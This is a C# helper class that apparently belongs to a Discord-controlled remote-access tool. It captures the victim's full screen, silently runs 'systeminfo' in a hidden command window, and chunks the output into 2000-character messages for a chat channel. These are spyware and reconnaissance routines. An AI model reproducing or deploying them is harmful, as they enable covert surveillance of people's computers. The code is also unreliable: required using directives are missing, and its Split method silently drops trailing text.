using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Data;
using System;
using System.Runtime.InteropServices;

public static class Utils {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr ptr);

    [DllImport("gdi32.dll")]
    public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);


    public static MemoryStream GetScreenshot()
    {
        IntPtr desktop = GetDesktopWindow();
        IntPtr hdc = GetWindowDC(desktop);
        int screenWidth = GetDeviceCaps(hdc, 8); 
        int screenHeight = GetDeviceCaps(hdc, 10);
        
        var bitmap = new Bitmap(screenWidth, screenHeight);
        var graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
        var stream = new MemoryStream();
        bitmap.Save(stream, ImageFormat.Png);
        stream.Position = 0;
        return stream;
    }

    public static string GetSystemInfo()
    {
        Process process = new Process();
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.FileName = "cmd.exe";
        startInfo.Arguments = "/C systeminfo";
        startInfo.RedirectStandardOutput = true;
        startInfo.UseShellExecute = false;
        process.StartInfo = startInfo;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }

    public static IEnumerable<string> Split(string str, int chunkSize)
    {
        return Enumerable.Range(0, str.Length / chunkSize)
            .Select(i => str.Substring(i * chunkSize, chunkSize));
    }

    public static IEnumerable<string> CommandOutputWrapper(string output)
    {
        IEnumerable<string> chunks = Split(output, 2000-8);
        foreach (string chunk in chunks)
        {
            yield return $"```\n{chunk}\n```";
        }
    }

    public static IEnumerable<string> MessageWrapper(string output)
    {
        IEnumerable<string> chunks = Split(output, 2000);
        foreach (string chunk in chunks)
        {
            yield return $"{chunk}";
        }
    }
}
